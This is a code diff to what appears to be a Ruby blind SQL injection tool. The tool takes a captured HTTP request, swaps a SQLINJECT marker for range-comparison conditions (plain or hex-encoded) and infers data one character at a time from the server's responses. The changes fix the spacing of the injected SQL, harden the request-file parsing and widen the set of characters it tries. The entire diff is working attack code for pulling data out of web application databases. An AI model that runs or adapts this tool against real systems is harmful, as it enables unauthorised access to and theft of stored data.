@@ -49,7 +49,7 @@ ARGV.each do |arg|
 	$case = "y" if arg.include?("--case")
 	$i = arg.split("=")[1].to_i - 1 if arg.include?("--start=")
 	$test = "y" if arg.include?("--test")
-	$bracket = arg.split("=")[1].to_i - 1 if arg.include?("--bracket=")
+	$bracket = arg.split("=")[1] if arg.include?("--bracket=")
 	alls = "y" if arg.include?("--special")
 
 	$search = arg.split("=")[1] if arg.include?("--pattern=") && arg.count("=") == 1
@@ -107,7 +107,7 @@ $response = ""
 # arrays for Blind exploitation
 $arrs = [",", "_", "."]
 if alls == "y"
-	$arrs += ["+", "/", ":", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "~", "`", "[", "]", "{", "}", ";", "<", ">", "?", "|", "\\", "\""]
+	$arrs += ["+", "/", ":", "-", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "~", "`", "[", "]", "{", "}", ";", "<", ">", "?", "|", "\\", "\"", " ", "\n", "\="]
 end
 $arrn1 = ["0", "1", "2", "3", "4"]
 $arrn2 = ["5", "6", "7", "8", "9"]
@@ -153,7 +153,11 @@ end
 # get connection host and port
 z = 1
 loop do
-	break if File.readlines($file)[z].chomp.empty?
+    begin
+	    break if File.readlines($file)[z].chomp.empty?
+    rescue
+        break
+    end
 	if File.readlines($file)[z].include?("Host: ")
 		$remote = File.readlines($file)[z].split(" ")[1]
 		if $proto == "http"
@@ -208,7 +212,11 @@ def configreq(chars)
 	i = 1
 	$headers = Hash.new
 	loop do
-		break if File.readlines($file)[i].chomp.empty?
+        begin
+		    break if File.readlines($file)[i].chomp.empty?
+        rescue
+            break
+        end
 		if !File.readlines($file)[i].include?("Host: ")
 			header = File.readlines($file)[i].chomp
 			if header.include?("SQLINJECT")
@@ -502,9 +510,9 @@ until $i >= $max  do
 
 		# lowercase
 		if $hex == "y"
-			configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "z".unpack('H*')[0])
+			configreq(" between " + "0x" + "a".unpack('H*')[0] + " and " + "0x" + "z".unpack('H*')[0])
 		else
-			configreq("between" + $oh + "a" + $oh + "and" + $oh + "z")
+			configreq("between " + $oh + "a" + $oh + "and" + $oh + "z")
 		end
 		sendreq()
 		send2ndreq() if $secfile != ""
@@ -515,9 +523,9 @@ until $i >= $max  do
 		}
 		if $response.body.include?($search) || $fheader == "y"
 			if $hex == "y"
-				configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "m".unpack('H*')[0])
+				configreq(" between " + "0x" + "a".unpack('H*')[0] + " and " + "0x" + "m".unpack('H*')[0])
 			else
-				configreq("between" + $oh + "a" + $oh + "and" + $oh + "m")
+				configreq("between " + $oh + "a" + $oh + "and" + $oh + "m")
 			end
 			sendreq()
 			send2ndreq() if $secfile != ""
@@ -528,9 +536,9 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "f".unpack('H*')[0])
+					configreq(" between " + "0x" + "a".unpack('H*')[0] + " and " + "0x" + "f".unpack('H*')[0])
 				else
-					configreq("between" + $oh + "a" + $oh + "and" + $oh + "f")
+					configreq("between " + $oh + "a" + $oh + "and" + $oh + "f")
 				end
 				sendreq()
 				send2ndreq() if $secfile != ""
@@ -541,9 +549,9 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq(" between" + " 0x" + "a".unpack('H*')[0] + " and " + "0x" + "c".unpack('H*')[0])
+						configreq(" between " + "0x" + "a".unpack('H*')[0] + " and " + "0x" + "c".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "a" + $oh + "and" + $oh + "c")
+						configreq("between " + $oh + "a" + $oh + "and" + $oh + "c")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -555,9 +563,9 @@ until $i >= $max  do
 					if $response.body.include?($search) || $fheader == "y"
 						for ch in $arr1
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -576,9 +584,9 @@ until $i >= $max  do
 					else
 						for ch in $arr2
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -597,9 +605,9 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq(" between" + " 0x" + "g".unpack('H*')[0] + " and " + "0x" + "i".unpack('H*')[0])
+						configreq(" between " + "0x" + "g".unpack('H*')[0] + " and " + "0x" + "i".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "g" + $oh + "and" + $oh + "i")
+						configreq("between " + $oh + "g" + $oh + "and" + $oh + "i")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -611,9 +619,9 @@ until $i >= $max  do
 					if $response.body.include?($search) || $fheader == "y"
 						for ch in $arr3
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -632,9 +640,9 @@ until $i >= $max  do
 					else
 						for ch in $arr4
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -654,9 +662,9 @@ until $i >= $max  do
 				end
 			else
 				if $hex == "y"
-					configreq(" between" + " 0x" + "n".unpack('H*')[0] + " and " + "0x" + "s".unpack('H*')[0])
+					configreq(" between " + "0x" + "n".unpack('H*')[0] + " and " + "0x" + "s".unpack('H*')[0])
 				else
-					configreq("between" + $oh + "n" + $oh + "and" + $oh + "s")
+					configreq("between " + $oh + "n" + $oh + "and" + $oh + "s")
 				end
 				sendreq()
 				send2ndreq() if $secfile != ""
@@ -667,9 +675,9 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq(" between" + " 0x" + "n".unpack('H*')[0] + " and " + "0x" + "p".unpack('H*')[0])
+						configreq(" between " + "0x" + "n".unpack('H*')[0] + " and " + "0x" + "p".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "n" + $oh + "and" + $oh + "p")
+						configreq("between " + $oh + "n" + $oh + "and" + $oh + "p")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -681,9 +689,9 @@ until $i >= $max  do
 					if $response.body.include?($search) || $fheader == "y"
 						for ch in $arr5
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -702,9 +710,9 @@ until $i >= $max  do
 					else
 						for ch in $arr6
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -723,9 +731,9 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq(" between" + " 0x" + "t".unpack('H*')[0] + " and " + "0x" + "v".unpack('H*')[0])
+						configreq(" between " + "0x" + "t".unpack('H*')[0] + " and " + "0x" + "v".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "t" + $oh + "and" + $oh + "v")
+						configreq("between " + $oh + "t" + $oh + "and" + $oh + "v")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -737,9 +745,9 @@ until $i >= $max  do
 					if $response.body.include?($search) || $fheader == "y"
 						for ch in $arr7
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -758,9 +766,9 @@ until $i >= $max  do
 					else
 						for ch in $arr8
 							if $hex == "y"
-								configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+								configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 							else
-								configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+								configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 							end
 							sendreq()
 							send2ndreq() if $secfile != ""
@@ -784,9 +792,9 @@ until $i >= $max  do
 		# uppercase - only when case-sensitive specified
 		if $case == "y" && found == 0
 			if $hex == "y"
-				configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "Z".unpack('H*')[0])
+				configreq(" between " + "0x" + "A".unpack('H*')[0] + " and " + "0x" + "Z".unpack('H*')[0])
 			else
-				configreq("between" + $oh + "A" + $oh + "and" + $oh + "Z")
+				configreq("between " + $oh + "A" + $oh + "and" + $oh + "Z")
 			end
 			sendreq()
 			send2ndreq() if $secfile != ""
@@ -797,9 +805,9 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "M".unpack('H*')[0])
+					configreq(" between " + "0x" + "A".unpack('H*')[0] + " and " + "0x" + "M".unpack('H*')[0])
 				else
-					configreq("between" + $oh + "A" + $oh + "and" + $oh + "M")
+					configreq("between " + $oh + "A" + $oh + "and" + $oh + "M")
 				end
 				sendreq()
 				send2ndreq() if $secfile != ""
@@ -810,9 +818,9 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "F".unpack('H*')[0])
+						configreq(" between " + "0x" + "A".unpack('H*')[0] + " and " + "0x" + "F".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "A" + $oh + "and" + $oh + "F")
+						configreq("between " + $oh + "A" + $oh + "and" + $oh + "F")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -823,9 +831,9 @@ until $i >= $max  do
 					}
 					if $response.body.include?($search) || $fheader == "y"
 						if $hex == "y"
-							configreq(" between" + " 0x" + "A".unpack('H*')[0] + " and " + "0x" + "C".unpack('H*')[0])
+							configreq(" between " + "0x" + "A".unpack('H*')[0] + " and " + "0x" + "C".unpack('H*')[0])
 						else
-							configreq("between" + $oh + "A" + $oh + "and" + $oh + "C")
+							configreq("between " + $oh + "A" + $oh + "and" + $oh + "C")
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -837,9 +845,9 @@ until $i >= $max  do
 						if $response.body.include?($search) || $fheader == "y"
 							for ch in $arr9
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -858,9 +866,9 @@ until $i >= $max  do
 						else
 							for ch in $arr10
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -879,9 +887,9 @@ until $i >= $max  do
 						end
 					else
 						if $hex == "y"
-							configreq(" between" + " 0x" + "G".unpack('H*')[0] + " and " + "0x" + "I".unpack('H*')[0])
+							configreq(" between " + "0x" + "G".unpack('H*')[0] + " and " + "0x" + "I".unpack('H*')[0])
 						else
-							configreq("between" + $oh + "G" + $oh + "and" + $oh + "I")
+							configreq("between " + $oh + "G" + $oh + "and" + $oh + "I")
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -893,9 +901,9 @@ until $i >= $max  do
 						if $response.body.include?($search) || $fheader == "y"
 							for ch in $arr11
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -914,9 +922,9 @@ until $i >= $max  do
 						else
 							for ch in $arr12
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -936,9 +944,9 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq(" between" + " 0x" + "N".unpack('H*')[0] + " and " + "0x" + "S".unpack('H*')[0])
+						configreq(" between " + "0x" + "N".unpack('H*')[0] + " and " + "0x" + "S".unpack('H*')[0])
 					else
-						configreq("between" + $oh + "N" + $oh + "and" + $oh + "S")
+						configreq("between " + $oh + "N" + $oh + "and" + $oh + "S")
 					end
 					sendreq()
 					send2ndreq() if $secfile != ""
@@ -949,9 +957,9 @@ until $i >= $max  do
 					}
 					if $response.body.include?($search) || $fheader == "y"
 						if $hex == "y"
-							configreq(" between" + " 0x" + "N".unpack('H*')[0] + " and " + "0x" + "P".unpack('H*')[0])
+							configreq(" between " + "0x" + "N".unpack('H*')[0] + " and " + "0x" + "P".unpack('H*')[0])
 						else
-							configreq("between" + $oh + "N" + $oh + "and" + $oh + "P")
+							configreq("between " + $oh + "N" + $oh + "and" + $oh + "P")
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -963,9 +971,9 @@ until $i >= $max  do
 						if $response.body.include?($search) || $fheader == "y"
 							for ch in $arr13
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -984,9 +992,9 @@ until $i >= $max  do
 						else
 							for ch in $arr14
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -1005,9 +1013,9 @@ until $i >= $max  do
 						end
 					else
 						if $hex == "y"
-							configreq(" between" + " 0x" + "T".unpack('H*')[0] + " and " + "0x" + "V".unpack('H*')[0])
+							configreq(" between " + "0x" + "T".unpack('H*')[0] + " and " + "0x" + "V".unpack('H*')[0])
 						else
-							configreq("between" + $oh + "T" + $oh + "and" + $oh + "V")
+							configreq("between " + $oh + "T" + $oh + "and" + $oh + "V")
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -1019,9 +1027,9 @@ until $i >= $max  do
 						if $response.body.include?($search) || $fheader == "y"
 							for ch in $arr15
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -1040,9 +1048,9 @@ until $i >= $max  do
 						else
 							for ch in $arr16
 								if $hex == "y"
-									configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+									configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 								else
-									configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+									configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 								end
 								sendreq()
 								send2ndreq() if $secfile != ""
@@ -1067,9 +1075,9 @@ until $i >= $max  do
 		# numeric
 		if found == 0
 			if $hex == "y"
-				configreq(" between" + " 0x" + "0".unpack('H*')[0] + " and " + "0x" + "9".unpack('H*')[0])
+				configreq(" between " + "0x" + "0".unpack('H*')[0] + " and " + "0x" + "9".unpack('H*')[0])
 			else
-				configreq("between" + $oh + "0" + $oh + "and" + $oh + "9")
+				configreq("between " + $oh + "0" + $oh + "and" + $oh + "9")
 			end
 			sendreq()
 			send2ndreq() if $secfile != ""
@@ -1080,9 +1088,9 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq(" between" + " 0x" + "0".unpack('H*')[0] + " and " + "0x" + "4".unpack('H*')[0])
+					configreq(" between " + "0x" + "0".unpack('H*')[0] + " and " + "0x" + "4".unpack('H*')[0])
 				else
-					configreq("between" + $oh + "0" + $oh + "and" + $oh + "4")
+					configreq("between " + $oh + "0" + $oh + "and" + $oh + "4")
 				end
 				sendreq()
 				send2ndreq() if $secfile != ""
@@ -1094,9 +1102,9 @@ until $i >= $max  do
 				if $response.body.include?($search) || $fheader == "y"
 					for ch in $arrn1
 						if $hex == "y"
-							configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+							configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 						else
-							configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+							configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -1115,9 +1123,9 @@ until $i >= $max  do
 				else
 					for ch in $arrn2
 						if $hex == "y"
-							configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+							configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 						else
-							configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+							configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 						end
 						sendreq()
 						send2ndreq() if $secfile != ""
@@ -1141,9 +1149,9 @@ until $i >= $max  do
 		if found == 0
 			for ch in $arrs
 				if $hex == "y"
-					configreq(" between" + " 0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
+					configreq(" between " + "0x" + ch.unpack('H*')[0] + " and " + "0x" + ch.unpack('H*')[0])
 				else
-					configreq("between" + $oh + ch + $oh + "and" + $oh + ch)
+					configreq("between " + $oh + ch + $oh + "and" + $oh + ch)
 				end
 				sendreq()
 				send2ndreq() if $secfile != ""
@@ -1165,7 +1173,7 @@ until $i >= $max  do
 
 		# lowercase
 		if $hex == "y"
-			configreq(">=" + " 0x" + "a".unpack('H*')[0])
+			configreq(">=" + "0x" + "a".unpack('H*')[0])
 		else
 			configreq(">=" + $oh + "a")
 		end
@@ -1178,7 +1186,7 @@ until $i >= $max  do
 		}
 		if $response.body.include?($search) || $fheader == "y"
 			if $hex == "y"
-				configreq("<=" + " 0x" + "m".unpack('H*')[0])
+				configreq("<=" + "0x" + "m".unpack('H*')[0])
 			else
 				configreq("<=" + $oh + "m")
 			end
@@ -1191,7 +1199,7 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq("<=" + " 0x" + "f".unpack('H*')[0])
+					configreq("<=" + "0x" + "f".unpack('H*')[0])
 				else
 					configreq("<=" + $oh + "f")
 				end
@@ -1204,7 +1212,7 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq("<=" + " 0x" + "c".unpack('H*')[0])
+						configreq("<=" + "0x" + "c".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "c")
 					end
@@ -1260,7 +1268,7 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq("<=" + " 0x" + "i".unpack('H*')[0])
+						configreq("<=" + "0x" + "i".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "i")
 					end
@@ -1317,7 +1325,7 @@ until $i >= $max  do
 				end
 			else
 				if $hex == "y"
-					configreq("<=" + " 0x" + "s".unpack('H*')[0])
+					configreq("<=" + "0x" + "s".unpack('H*')[0])
 				else
 					configreq("<=" + $oh + "s")
 				end
@@ -1330,7 +1338,7 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq("<=" + " 0x" + "p".unpack('H*')[0])
+						configreq("<=" + "0x" + "p".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "p")
 					end
@@ -1386,7 +1394,7 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq("<=" + " 0x" + "v".unpack('H*')[0])
+						configreq("<=" + "0x" + "v".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "v")
 					end
@@ -1447,7 +1455,7 @@ until $i >= $max  do
 		# uppercase - only when case-sensitive specified
 		if $case == "y" && found == 0
 			if $hex == "y"
-				configreq(">=" + " 0x" + "A".unpack('H*')[0])
+				configreq(">=" + "0x" + "A".unpack('H*')[0])
 			else
 				configreq(">=" + $oh + "A")
 			end
@@ -1460,7 +1468,7 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq("<=" + " 0x" + "M".unpack('H*')[0])
+					configreq("<=" + "0x" + "M".unpack('H*')[0])
 				else
 					configreq("<=" + $oh + "M")
 				end
@@ -1473,7 +1481,7 @@ until $i >= $max  do
 				}
 				if $response.body.include?($search) || $fheader == "y"
 					if $hex == "y"
-						configreq("<=" + " 0x" + "F".unpack('H*')[0])
+						configreq("<=" + "0x" + "F".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "F")
 					end
@@ -1486,7 +1494,7 @@ until $i >= $max  do
 					}
 					if $response.body.include?($search) || $fheader == "y"
 						if $hex == "y"
-							configreq("<=" + " 0x" + "C".unpack('H*')[0])
+							configreq("<=" + "0x" + "C".unpack('H*')[0])
 						else
 							configreq("<=" + $oh + "C")
 						end
@@ -1542,7 +1550,7 @@ until $i >= $max  do
 						end
 					else
 						if $hex == "y"
-							configreq("<=" + " 0x" + "I".unpack('H*')[0])
+							configreq("<=" + "0x" + "I".unpack('H*')[0])
 						else
 							configreq("<=" + $oh + "I")
 						end
@@ -1599,7 +1607,7 @@ until $i >= $max  do
 					end
 				else
 					if $hex == "y"
-						configreq("<=" + " 0x" + "S".unpack('H*')[0])
+						configreq("<=" + "0x" + "S".unpack('H*')[0])
 					else
 						configreq("<=" + $oh + "S")
 					end
@@ -1612,7 +1620,7 @@ until $i >= $max  do
 					}
 					if $response.body.include?($search) || $fheader == "y"
 						if $hex == "y"
-							configreq("<=" + " 0x" + "P".unpack('H*')[0])
+							configreq("<=" + "0x" + "P".unpack('H*')[0])
 						else
 							configreq("<=" + $oh + "P")
 						end
@@ -1668,7 +1676,7 @@ until $i >= $max  do
 						end
 					else
 						if $hex == "y"
-							configreq("<=" + " 0x" + "V".unpack('H*')[0])
+							configreq("<=" + "0x" + "V".unpack('H*')[0])
 						else
 							configreq("<=" + $oh + "V")
 						end
@@ -1730,7 +1738,7 @@ until $i >= $max  do
 		# numeric
 		if found == 0
 			if $hex == "y"
-				configreq(">=" + " 0x" + "0".unpack('H*')[0])
+				configreq(">=" + "0x" + "0".unpack('H*')[0])
 			else
 				configreq(">=" + $oh + "0")
 			end
@@ -1743,7 +1751,7 @@ until $i >= $max  do
 			}
 			if $response.body.include?($search) || $fheader == "y"
 				if $hex == "y"
-					configreq("<=" + " 0x" + "4".unpack('H*')[0])
+					configreq("<=" + "0x" + "4".unpack('H*')[0])
 				else
 					configreq("<=" + $oh + "4")
 				end
